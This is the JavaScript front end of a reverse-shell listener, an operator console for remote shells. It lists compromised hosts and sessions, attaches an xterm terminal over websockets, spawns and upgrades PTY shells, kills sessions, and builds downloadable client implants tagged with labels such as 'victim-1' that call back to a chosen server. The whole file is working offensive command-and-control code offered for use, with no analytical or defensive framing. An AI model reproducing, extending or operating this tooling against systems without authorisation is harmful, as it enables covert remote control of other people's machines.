import { state, el, list, when, mount } from "@nemanjan00/qrp";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

import "@xterm/xterm/css/xterm.css";
import "./theme.css";

// --- Dracula theme for xterm ------------------------------------------------
const draculaTheme = {
  background: "#282a36",
  foreground: "#f8f8f2",
  cursor: "#f8f8f2",
  cursorAccent: "#282a36",
  selectionBackground: "#44475a",
  black: "#21222c",
  red: "#ff5555",
  green: "#50fa7b",
  yellow: "#f1fa8c",
  blue: "#bd93f9",
  magenta: "#ff79c6",
  cyan: "#8be9fd",
  white: "#f8f8f2",
  brightBlack: "#6272a4",
  brightRed: "#ff6e6e",
  brightGreen: "#69ff94",
  brightYellow: "#ffffa5",
  brightBlue: "#d6acff",
  brightMagenta: "#ff92df",
  brightCyan: "#a4ffff",
  brightWhite: "#ffffff",
};

// --- Reactive app state -----------------------------------------------------
const app = state({
  sessions: [], // array of session metas
  hosts: [],    // array of host metas (mux clients)
  currentId: null,
  connected: false, // terminal websocket connected
  sidebarOpen: false, // mobile hamburger state
  buildTargets: [],
  buildTarget: "linux-amd64",
  buildServer: "",
  buildTags: "",
  building: false,
  hostDetailsId: null, // which host is shown in the details overlay
  search: "", // sidebar filter text
});

const current = () => app.sessions.find((s) => s.id === app.currentId) || null;

const hostMatches = (h) => {
  const q = app.search.trim().toLowerCase();
  if (!q) return true;
  return [h.label, h.hostname, h.username, h.os, h.arch, h.tags, h.remote, h.id]
    .filter(Boolean)
    .some((v) => String(v).toLowerCase().includes(q));
};
const sessionMatches = (s) => {
  const q = app.search.trim().toLowerCase();
  if (!q) return true;
  return [s.remote, s.transport, s.id].filter(Boolean).some((v) =>
    String(v).toLowerCase().includes(q)
  );
};
const liveSessions = () => app.sessions.filter((s) => s.alive && sessionMatches(s));
const deadSessions = () => app.sessions.filter((s) => !s.alive && sessionMatches(s));
const liveHosts = () => app.hosts.filter((h) => h.alive && hostMatches(h));

const wsUrl = (path) =>
  (location.protocol === "https:" ? "wss://" : "ws://") + location.host + path;

// --- Terminal controller (kept outside qrp's reactive DOM) ------------------
const termCtl = (() => {
  let term = null;
  let fit = null;
  let ws = null;

  const doFit = () => {
    if (fit) {
      try {
        fit.fit();
      } catch {
        /* container not measurable yet */
      }
    }
  };

  const sendResize = () => {
    if (ws && ws.readyState === WebSocket.OPEN && term) {
      ws.send(JSON.stringify({ type: "resize", cols: term.cols, rows: term.rows }));
    }
  };

  const detach = () => {
    window.removeEventListener("resize", doFit);
    if (ws) {
      ws.onclose = null;
      try {
        ws.close();
      } catch {
        /* ignore */
      }
      ws = null;
    }
    if (term) {
      term.dispose();
      term = null;
    }
    fit = null;
    app.connected = false;
  };

  const attach = (id) => {
    detach();
    const termHost = document.getElementById("term-host");
    if (!termHost) return;
    termHost.innerHTML = "";

    term = new Terminal({
      theme: draculaTheme,
      fontFamily: '"Hack Nerd Font Mono", "JetBrains Mono", ui-monospace, Menlo, monospace',
      fontSize: 13,
      cursorBlink: true,
      convertEol: false,
      scrollback: 5000,
      allowProposedApi: true,
      mouseEvents: true,
      screenReaderMode: false,
    });
    fit = new FitAddon();
    term.loadAddon(fit);
    term.open(termHost);
    doFit();
    term.focus();

    ws = new WebSocket(wsUrl("/api/ws/session/" + id));
    ws.binaryType = "arraybuffer";

    ws.onopen = () => {
      app.connected = true;
      sendResize();
    };
    ws.onclose = () => {
      app.connected = false;
    };
    ws.onmessage = (ev) => {
      if (typeof ev.data === "string") {
        try {
          const msg = JSON.parse(ev.data);
          if (msg.type === "exit") app.connected = false;
        } catch {
          /* ignore */
        }
        return;
      }
      term.write(new Uint8Array(ev.data));
    };

    const enc = new TextEncoder();
    term.onData((d) => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(enc.encode(d));
      }
    });
    // Mouse events are handled by xterm internally when mouseEvents:true and
    // translated into the appropriate OSC/CSI sequences in the onData stream.
    // We also make sure the terminal container captures pointer events.
    if (termHost) {
      termHost.style.pointerEvents = "auto";
      termHost.style.touchAction = "none";
    }
    term.onResize(() => sendResize());

    window.addEventListener("resize", doFit);
  };

  return { attach, detach, sendResize };
})();

// --- Actions ---------------------------------------------------------------
function selectSession(id) {
  app.currentId = id;
  app.sidebarOpen = false;
  termCtl.attach(id);
}

async function killCurrent() {
  const c = current();
  if (!c) return;
  await fetch(`/api/sessions/${c.id}/kill`, { method: "POST" }).catch(() => {});
}

async function clearDeadSessions() {
  await fetch("/api/sessions/clear-dead", { method: "POST" }).catch(() => {});
}

function upgradeCurrent() {
  const c = current();
  if (!c) return;
  // Sent over the terminal websocket's control channel.
  const ws = new WebSocket(wsUrl("/api/ws/session/" + c.id));
  ws.binaryType = "arraybuffer";
  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "upgrade" }));
    setTimeout(() => ws.close(), 200);
  };
}

async function openHostShell(hostId) {
  const host = app.hosts.find((h) => h.id === hostId);
  if (!host || !host.alive) return;
  const cols = termCtl.term?.cols || 80;
  const rows = termCtl.term?.rows || 24;
  await fetch(`/api/hosts/${hostId}/shells`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cols, rows }),
  }).catch(() => {});
}

function openHostDetails(hostId) {
  app.hostDetailsId = hostId;
}

function closeHostDetails() {
  app.hostDetailsId = null;
}

function currentHost() {
  return app.hosts.find((h) => h.id === app.hostDetailsId) || null;
}

async function loadBuildTargets() {
  try {
    const res = await fetch("/api/build/targets");
    if (res.ok) {
      app.buildTargets = await res.json();
      if (!app.buildTargets.includes(app.buildTarget)) {
        app.buildTarget = app.buildTargets[0] || "";
      }
    }
  } catch {
    /* ignore */
  }
  if (!app.buildServer) {
    const proto = location.protocol === "https:" ? "wss://" : "ws://";
    app.buildServer = `${proto}${location.host}/mux`;
  }
}

function buildClientUrl() {
  const t = app.buildTarget || "linux-amd64";
  const s = app.buildServer || "";
  const tg = app.buildTags || "";
  const q = new URLSearchParams({ target: t, server: s, tags: tg });
  return `/api/build/client?${q}`;
}

async function downloadClient() {
  if (app.building) return;
  app.building = true;
  try {
    const res = await fetch(buildClientUrl());
    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      alert("Build failed: " + (err.detail || res.statusText));
      return;
    }
    const blob = await res.blob();
    const cd = res.headers.get("Content-Disposition") || "";
    const m = cd.match(/filename="?([^"]+)"?/i);
    const name = m ? m[1] : "rsl-client";
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  } catch (err) {
    alert("Build failed: " + err.message);
  } finally {
    app.building = false;
  }
}

// --- Session list stream ---------------------------------------------------
function connectSessionsStream() {
  const ws = new WebSocket(wsUrl("/api/ws/sessions"));

  ws.onmessage = (ev) => {
    let m;
    try {
      m = JSON.parse(ev.data);
    } catch {
      return;
    }
    if (m.type === "snapshot") {
      app.sessions = m.sessions;
      app.hosts = m.hosts || [];
    } else if (m.type === "add") {
      app.sessions = [...app.sessions.filter((s) => s.id !== m.session.id), m.session];
    } else if (m.type === "update") {
      app.sessions = app.sessions.map((s) => (s.id === m.session.id ? m.session : s));
    } else if (m.type === "remove") {
      app.sessions = app.sessions.filter((s) => s.id !== m.session.id);
      if (app.currentId === m.session.id) {
        app.currentId = null;
        termCtl.detach();
      }
    } else if (m.type === "host_add") {
      app.hosts = [...app.hosts.filter((h) => h.id !== m.host.id), m.host];
    } else if (m.type === "host_update") {
      app.hosts = app.hosts.map((h) => (h.id === m.host.id ? m.host : h));
    } else if (m.type === "host_remove") {
      app.hosts = app.hosts.filter((h) => h.id !== m.host.id);
    }
    // Auto-select the first live session if nothing is selected.
    if (!app.currentId) {
      const first = liveSessions()[0];
      if (first) selectSession(first.id);
    }
  };

  ws.onclose = () => setTimeout(connectSessionsStream, 1500);
  ws.onerror = () => {
    try {
      ws.close();
    } catch {
      /* ignore */
    }
  };
}

// --- Views -----------------------------------------------------------------
const Brand = () =>
  el(
    "div",
    { class: "brand" },
    el("div", { class: "logo" }, "»_"),
    el(
      "div",
      {},
      el("h1", {}, "REVERSE SHELL"),
      el("div", { class: "sub" }, "listener")
    )
  );

const sessionRow = (s) =>
  el(
    "div",
    {
      class: () =>
        "session " +
        (s.alive ? "" : "dead ") +
        (app.currentId === s.id ? "active" : ""),
      onclick: () => selectSession(s.id),
    },
    el("span", { class: "dot" }),
    el(
      "div",
      { class: "meta" },
      el("div", { class: "remote" }, s.remote),
      el("div", { class: "sub" }, `#${s.id}`)
    ),
    el("span", { class: "badge " + s.transport }, s.transport)
  );

const hostRow = (h) =>
  el(
    "div",
    {
      class: "session host",
      onclick: () => openHostDetails(h.id),
    },
    el("span", { class: "dot" }),
    el(
      "div",
      { class: "meta" },
      el("div", { class: "remote" }, h.label || h.hostname || h.remote),
      el(
        "div",
        { class: "sub" },
        `${h.username || "?"}@${h.os}/${h.arch} #${h.id}`
      )
    ),
    el(
      "button",
      {
        class: "btn micro",
        onclick: (e) => {
          e.stopPropagation();
          openHostShell(h.id);
        },
        title: "Open a new PTY shell on this host",
      },
      "+ shell"
    )
  );

const BuildPanel = () =>
  el(
    "div",
    { class: "build-panel" },
    el(
      "div",
      { class: "list-group-label" },
      el("span", {}, "Build client")
    ),
    el(
      "label",
      { class: "field" },
      el("span", {}, "Server URL"),
      el("input", {
        type: "text",
        placeholder: "ws://1.2.3.4:8080/mux",
        value: () => app.buildServer,
        oninput: (e) => (app.buildServer = e.target.value),
      })
    ),
    el(
      "label",
      { class: "field" },
      el("span", {}, "Tags"),
      el("input", {
        type: "text",
        placeholder: "victim-1",
        value: () => app.buildTags,
        oninput: (e) => (app.buildTags = e.target.value),
      })
    ),
    el(
      "label",
      { class: "field" },
      el("span", {}, "Target"),
      el(
        "select",
        {
          onchange: (e) => (app.buildTarget = e.target.value),
        },
        list(
          () => app.buildTargets,
          (t) => t,
          (t) =>
            el(
              "option",
              { value: t, selected: () => app.buildTarget === t },
              t
            )
        )
      )
    ),
    el(
      "button",
      {
        class: "btn",
        disabled: () => app.building,
        onclick: downloadClient,
      },
      () => (app.building ? "Building…" : "Download")
    )
  );

const HostDetails = () =>
  when(
    () => app.hostDetailsId !== null,
    () => {
      const h = currentHost();
      if (!h) {
        app.hostDetailsId = null;
        return el("div");
      }
      const channelSessions = (h.channelList || []).map((c) => {
        const s = app.sessions.find((s) => s.id === c.sessionId);
        return { ...c, session: s };
      });
      return el(
        "div",
        {
          class: "host-details-overlay",
          onclick: (e) => {
            if (e.target.classList.contains("host-details-overlay")) closeHostDetails();
          },
        },
        el(
          "div",
          { class: "host-details" },
          el(
            "div",
            { class: "host-details-header" },
            el(
              "div",
              { class: "host-details-title" },
              el("div", { class: "remote" }, h.label || h.hostname || h.remote),
              el(
                "div",
                { class: "sub" },
                `${h.username || "?"}@${h.hostname || "?"} · ${h.os}/${h.arch} · ${h.id}`
              )
            ),
            el(
              "button",
              {
                class: "btn micro",
                onclick: closeHostDetails,
                title: "Close",
              },
              "×"
            )
          ),
          el(
            "div",
            { class: "host-details-meta" },
            kv("Remote", h.remote),
            kv("Tags", h.tags || "—"),
            kv("Status", h.alive ? "alive" : "dead"),
            kv("Channels", `${h.channels || 0}`),
            kv("Created", new Date(h.createdAt).toLocaleString())
          ),
          el(
            "div",
            { class: "list-group-label" },
            el("span", {}, "Channels"),
            el("span", {}, () => `${channelSessions.length}`)
          ),
          when(
            () => channelSessions.length === 0,
            () => el("div", { class: "empty" }, "No open channels")
          ),
          ...channelSessions.map((c) =>
            el(
              "div",
              {
                class: "channel-row " + (c.alive ? "" : "dead"),
                onclick: () => {
                  if (c.alive && c.sessionId) {
                    selectSession(c.sessionId);
                    closeHostDetails();
                  }
                },
              },
              el("span", { class: "dot" }),
              el(
                "div",
                { class: "meta" },
                el("div", { class: "remote" }, `ch#${c.channelId} → ${c.sessionId}`),
                el(
                  "div",
                  { class: "sub" },
                  c.alive ? "alive" : "exited"
                )
              ),
              el(
                "span",
                { class: "badge " + (c.alive ? "mux" : "dead") },
                c.alive ? "mux" : "dead"
              )
            )
          ),
          el(
            "div",
            { class: "host-details-actions" },
            el(
              "button",
              {
                class: "btn",
                disabled: () => !h.alive,
                onclick: () => {
                  openHostShell(h.id);
                  closeHostDetails();
                },
              },
              "+ new shell"
            )
          )
        )
      );
    }
  );

const kv = (k, v) =>
  el(
    "div",
    { class: "kv" },
    el("span", { class: "k" }, k),
    el("span", { class: "v" }, String(v))
  );

const Sidebar = () =>
  el(
    "aside",
    {
      class: () => "sidebar " + (app.sidebarOpen ? "open" : ""),
    },
    Brand(),
    el(
      "div",
      { class: "search-wrap" },
      el("input", {
        type: "text",
        class: "search",
        placeholder: "Filter hosts / sessions…",
        value: () => app.search,
        oninput: (e) => (app.search = e.target.value),
      })
    ),
    el(
      "div",
      { class: "session-list" },
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Hosts"),
        el("span", {}, () => `${liveHosts().length}`)
      ),
      list(liveHosts, (h) => h.id, hostRow),
      when(
        () => liveHosts().length === 0,
        () => el("div", { class: "empty" }, "No mux hosts")
      ),
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Active"),
        el("span", {}, () => `${liveSessions().length}`)
      ),
      list(liveSessions, (s) => s.id, sessionRow),
      when(
        () => liveSessions().length === 0,
        () => el("div", { class: "empty" }, "No active sessions")
      ),
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Offline"),
        el("span", {}, () => `${deadSessions().length}`),
        when(
          () => deadSessions().length > 0,
          () =>
            el(
              "button",
              {
                class: "btn micro clear-dead",
                onclick: clearDeadSessions,
                title: "Remove all offline sessions",
              },
              "Clear"
            )
        )
      ),
      list(deadSessions, (s) => s.id, sessionRow),
      when(
        () => deadSessions().length === 0,
        () => el("div", { class: "empty" }, "None")
      )
    ),
    BuildPanel()
  );

const Hamburger = () =>
  el(
    "button",
    {
      class: "hamburger",
      onclick: () => (app.sidebarOpen = !app.sidebarOpen),
      "aria-label": "Toggle sessions",
      title: "Sessions",
    },
    el("span", {}),
    el("span", {}),
    el("span", {})
  );

const Toolbar = () =>
  el(
    "header",
    { class: "toolbar" },
    Hamburger(),
    el(
      "div",
      { class: "title" },
      () => (current() ? `${current().remote}` : "No session selected"),
      when(
        () => current(),
        () =>
          el(
            "span",
            { class: () => "badge " + (current() ? current().transport : "") },
            () => (current() ? current().transport : "")
          )
      ),
      when(
        () => current() && current().upgraded,
        () => el("span", { class: "badge tls" }, "PTY")
      )
    ),
    el("div", { class: "spacer" }),
    el(
      "div",
      {
        class: () =>
          "status " +
          (!current()
            ? ""
            : !current().alive
              ? "dead"
              : app.connected
                ? "connected"
                : ""),
      },
      el("span", { class: "dot" }),
      () =>
        !current()
          ? "idle"
          : !current().alive
            ? "dead"
            : app.connected
              ? "connected"
              : "connecting…"
    ),
    el(
      "button",
      {
        class: "btn",
        disabled: () =>
          !current() || !current().alive || current().transport === "webshell",
        onclick: upgradeCurrent,
        title: "Upgrade the remote shell to a PTY-backed bash",
      },
      "Upgrade PTY"
    ),
    el(
      "button",
      {
        class: "btn danger",
        disabled: () => !current() || !current().alive,
        onclick: killCurrent,
      },
      "Kill"
    )
  );

const Main = () =>
  el(
    "main",
    { class: "main" },
    Toolbar(),
    el(
      "div",
      { class: "content-area" },
      el(
        "div",
        { class: "term-wrap", style: () => (app.currentId ? "" : "display:none") },
        el("div", { id: "term-host", class: "term-host" })
      ),
      el(
        "div",
        { class: "placeholder", style: () => (app.currentId ? "display:none" : "") },
        el("div", {}, el("div", { class: "big" }, "Reverse Shell Listener"),
          el("div", {}, "Select a session to attach a terminal"))
      )
    )
  );

const SidebarBackdrop = () =>
  el(
    "div",
    {
      class: () => "sidebar-backdrop " + (app.sidebarOpen ? "open" : ""),
      onclick: () => (app.sidebarOpen = false),
    },
    ""
  );

// --- Boot ------------------------------------------------------------------
mount(document.getElementById("app"), () =>
  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails())
);

connectSessionsStream();
loadBuildTargets();
